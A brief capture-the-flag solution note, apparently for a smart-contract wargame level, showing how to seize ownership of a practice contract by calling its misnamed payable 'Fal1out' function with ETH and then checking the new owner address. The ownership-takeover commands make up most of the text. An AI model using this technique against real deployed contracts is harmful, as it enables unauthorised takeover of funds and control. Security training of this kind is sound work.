Idea is to call the function that changes the owner, with some ETH since it's a payable function.

contract.Fal1out({value: toWei(0.02)})

To verify changed owner:
await contract.owner()
"0x6ba166580bd6989f2cad8b5245d269b845694baf"

